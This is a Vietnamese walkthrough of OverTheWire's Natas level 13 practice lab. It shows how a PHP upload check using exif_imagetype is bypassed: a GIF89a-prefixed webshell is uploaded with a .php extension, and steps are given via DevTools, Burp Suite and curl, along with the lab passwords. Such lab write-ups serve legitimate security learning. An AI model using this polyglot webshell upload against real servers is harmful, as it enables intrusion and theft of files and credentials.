# Level 13 -> Level 14

For security reasons, we now only accept image files!

Choose a JPEG to upload (max 1KB):
[Chọn tệp] [Upload File]

---

## 1. THÔNG TIN TRUY CẬP (DÙNG PASSWORD TÌM ĐƯỢC TỪ NATAS 12)

- **URL**: `http://natas13.natas.labs.overthewire.org`
- **Username**: `natas13`
- **Password**: `g8ba0olAzaSJuyS4gnmbdVVigAICLG1k`
- **Giao thức xác thực**: HTTP Basic Authentication

---

## 2. THỬ THÁCH & KIẾN THỨC NỀN TẢNG CỦA LEVEL 13

### Thử thách
Tương tự như Level 12, trang web cung cấp tính năng tải tệp ảnh lên máy chủ (Upload File). Tuy nhiên, hệ thống đã bổ sung thêm một dòng thông báo cảnh báo:
*"For security reasons, we now only accept image files!"* (Vì lý do bảo mật, bây giờ chúng tôi chỉ chấp nhận các tệp hình ảnh!).

Bên dưới biểu mẫu có liên kết **`View sourcecode`**.

### Phân tích mã nguồn PHP (`index-source.html`)
Mở mã nguồn trang web, ta quan sát các đoạn mã xử lý tệp tin tải lên:

```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err = $_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
```

### Manh mối & Kiến thức cốt lõi: Vượt qua cơ chế kiểm tra định dạng tệp (Bypassing File Upload Restriction via Magic Bytes)

1. **Điểm mới so với Level 12: Hàm kiểm tra `exif_imagetype()`**:
   - Ở Level 12, máy chủ chỉ kiểm tra dung lượng tệp (`filesize`).
   - Ở Level 13, lập trình viên đã thêm điều kiện kiểm tra định dạng ảnh:
     ```php
     else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
         echo "File is not an image";
     }
     ```
   - Nếu hàm `exif_imagetype()` trả về `false` (nghĩa là không nhận diện được chữ ký tệp ảnh hợp lệ), hệ thống sẽ từ chối và báo lỗi *"File is not an image"*.

2. **Cách hoạt động và điểm yếu của `exif_imagetype()`**:
   - Hàm `exif_imagetype()` của PHP xác định định dạng tệp bằng cách đọc vài byte đầu tiên của tệp tin, được gọi là **Magic Bytes** (File Signature / Chữ ký tệp):
     - Ảnh GIF: Bắt đầu bằng chuỗi ký tự `GIF87a` hoặc `GIF89a` (mã Hex: `47 49 46 38 39 61`).
     - Ảnh JPEG / JPG: Bắt đầu bằng các byte `FF D8 FF`.
     - Ảnh PNG: Bắt đầu bằng các byte `89 50 4E 47 0D 0A 1A 0A`.
   - **Lỗ hổng**: Hàm này chỉ kiểm tra phần đầu của tệp mà **không hề quét toàn bộ nội dung** xem có chứa mã PHP thực thi hay không.

3. **Lỗ hổng kiểm soát phần mở rộng vẫn tồn tại**:
   - Máy chủ vẫn lấy phần mở rộng tệp tin từ thẻ ẩn `$_POST["filename"]` do người dùng gửi lên thay vì trích xuất từ tên tệp thật.
   - Do đó, ta hoàn toàn có thể đổi đuôi lưu trữ thành **`.php`**.

4. **Kỹ thuật chèn Magic Bytes vào Webshell (Polyglot File)**:
   - Nếu ta tạo một tệp mã PHP và chèn chuỗi `GIF89a` vào ngay đầu dòng:
     ```php
     GIF89a<?php echo file_get_contents('/etc/natas_webpass/natas14'); ?>
     ```
   - Khi tệp này được tải lên:
     - Hàm `exif_imagetype()` đọc các byte đầu tiên thấy chuỗi `GIF89a` $\rightarrow$ Nhận diện tệp là ảnh GIF hợp lệ (`IMAGETYPE_GIF`) $\rightarrow$ Vượt qua kiểm tra bảo mật thành công!
     - Khi máy chủ Apache biên dịch tệp với đuôi `.php`, chuỗi ký tự `GIF89a` sẽ được coi là văn bản tĩnh và xuất ra màn hình, còn đoạn mã `<?php ... ?>` ngay sau đó sẽ được thực thi để đọc mật khẩu của Level 14.

---

## 3. CÔNG CỤ CẦN DÙNG

- **Trình soạn thảo văn bản (Notepad)**: Tạo tệp PHP Webshell có chứa Magic Bytes.
- **Trình duyệt Web (DevTools F12)**: Sửa trực tiếp thuộc tính `value` của thẻ ẩn `input` trên trang web.
- **Burp Suite**: Bắt gói tin tải lên và đổi giá trị tham số `filename`.
- **Dòng lệnh CLI (cURL)**: Gửi request POST multipart từ terminal.

---

## 4. CÁC BƯỚC THỰC HIỆN ĐỂ LẤY PASSWORD LEVEL 14

### Bước chuẩn bị: Tệp mã PHP có Magic Bytes GIF
Sử dụng tệp tin [src/shell13.php](src/shell13.php) (hoặc [src/shell13.png](src/shell13.png)) trong thư mục `src/`, bên trong chứa nội dung sau:

```php
GIF89a<?php echo file_get_contents('/etc/natas_webpass/natas14'); ?>
```

*(Lưu ý: Chuỗi `GIF89a` viết liền ngay đầu tệp để đánh lừa hàm `exif_imagetype`)*.

---

### Cách 1: Thao tác trực tiếp trên Trình duyệt bằng F12 (Nhanh nhất)

- **Bước 1**: Mở trình duyệt và truy cập đường dẫn:
  ```text
  http://natas13.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas13`
  - **Pass**: `g8ba0olAzaSJuyS4gnmbdVVigAICLG1k`

- **Bước 2**: Bấm phím **`F12`** (hoặc click chuột phải vào nút **Upload File** chọn **Inspect** / Kiểm tra) $\rightarrow$ chọn tab **Elements**.

- **Bước 3**: Tìm đến dòng thẻ `input` ẩn trong mã HTML:
  *(Lưu ý: Nếu thẻ `<div id="content">` đang thu gọn dạng `▶ <div id="content">...</div>`, bạn bấm vào dấu mũi tên `▶` để mở rộng thẻ này và thẻ `<form>` bên trong ra, hoặc nhấn `Ctrl + F` tìm từ khóa `filename`)*:
  ```html
  <input type="hidden" name="filename" value="xxxxxx.jpg">
  ```
  Click đúp chuột vào giá trị `xxxxxx.jpg` và sửa đuôi mở rộng thành `.php` (ví dụ đổi thành `shell13.php`):
  ```html
  <input type="hidden" name="filename" value="shell13.php">
  ```

- **Bước 4**: Quay lại giao diện trang web:
  - Bấm nút **Chọn tệp (Choose File)** $\rightarrow$ chọn tệp `shell13.php` (hoặc `shell13.png`) trong thư mục `src/`.
  - Bấm nút **Upload File**.

- **Bước 5**: Trang web thông báo tải lên thành công kèm liên kết xem tệp dạng:
  ```text
  The file upload/xxxxxx.php has been uploaded
  ```

- **Bước 6**: Nhấp chuột vào liên kết `upload/xxxxxx.php` vừa hiện ra. Máy chủ sẽ thực thi mã PHP và in trực tiếp mật khẩu của `natas14` lên màn hình (kèm theo tiền tố `GIF89a`)!

---

### Cách 2: Sử dụng Burp Suite

- **Bước 1**: Mở trình duyệt tích hợp của Burp Suite (`Open browser`) và truy cập đường dẫn:
  ```text
  http://natas13.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas13`
  - **Pass**: `g8ba0olAzaSJuyS4gnmbdVVigAICLG1k`

- **Bước 2**: Trên giao diện trang web, chọn tệp `shell13.php` (hoặc `shell13.png`) trong thư mục `src/` cần tải lên.
- **Bước 3**: Chuyển sang giao diện Burp Suite, vào tab **`Proxy`** $\rightarrow$ bấm bật **`Intercept is on`**.
- **Bước 4**: Quay lại trình duyệt và bấm nút **Upload File**.
- **Bước 5**: Gói tin gửi tệp bị chặn lại tại tab `Intercept`. Ta quan sát nội dung tệp đã có chữ ký `GIF89a` ở đầu:
  ```http
  Content-Disposition: form-data; name="uploadedfile"; filename="shell13.php"
  Content-Type: ...

  GIF89a<?php echo file_get_contents('/etc/natas_webpass/natas14'); ?>
  ```
  Tìm đến khối dữ liệu của tham số `filename`:
  ```http
  Content-Disposition: form-data; name="filename"

  xxxxxx.jpg
  ```
  Sửa giá trị `xxxxxx.jpg` thành:
  ```http
  shell13.php
  ```
- **Bước 6**: Bấm nút màu cam **`Forward`** để gửi gói tin đi.
- **Bước 7**: Trên trình duyệt, bấm vào đường dẫn `upload/xxxxxx.php` để đọc mật khẩu.

---

### Cách 3: Sử dụng dòng lệnh PowerShell / Terminal với cURL

Gửi gói tin tải tệp multipart trực tiếp từ dòng lệnh:

```powershell
curl.exe -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k -F "filename=exploit.php" -F "uploadedfile=GIF89a<?php echo file_get_contents('/etc/natas_webpass/natas14'); ?>;filename=exploit.php;type=image/gif" http://natas13.natas.labs.overthewire.org/index.php
```

*Sau khi nhận được thông báo chứa đường dẫn `upload/xxxxxx.php`, truy cập đường dẫn đó để lấy mật khẩu:*
```powershell
curl.exe -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k http://natas13.natas.labs.overthewire.org/upload/xxxxxx.php
```

---

## 5. KẾT QUẢ / MẬT KHẨU LEVEL 14

Khi truy cập vào tệp tải lên, màn hình sẽ hiển thị chuỗi kết hợp:
```text
GIF89aA0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
```
Trong đó:
- `GIF89a`: Là 6 ký tự Magic Bytes ở đầu tệp tin dùng để vượt qua kiểm tra định dạng ảnh (cần bỏ qua phần này).
- `A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8`: Là nội dung mật khẩu thực sự do mã PHP đọc được từ hệ thống.

```text
Password natas14: [A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8]
```
